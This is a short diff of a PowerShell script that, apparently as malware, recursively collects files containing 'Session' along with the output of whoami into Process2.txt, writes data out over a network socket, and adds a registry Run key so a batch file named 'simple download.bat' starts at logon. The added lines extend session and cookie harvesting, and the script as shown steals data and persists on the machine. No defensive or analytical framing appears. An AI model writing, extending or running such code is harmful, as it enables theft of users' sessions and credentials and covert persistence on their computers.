@@ -1,4 +1,4 @@
-cat Cookies | Out-File -FilePath ./Process2.txt -Append
+Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Session' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process2.txt 
 
 whoami | Out-File -FilePath ./Process2.txt -Append
 
@@ -20,6 +20,8 @@ $stream.write($test,0,$test.Length);
 $writer.flush();
 $socket.close()
 
+
+
 #set registry
 
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
@@ -27,6 +29,3 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
     -Value "C:\Documents\#simple download.bat"
 
 Start-Sleep -Seconds 1.5
-exit
-
-
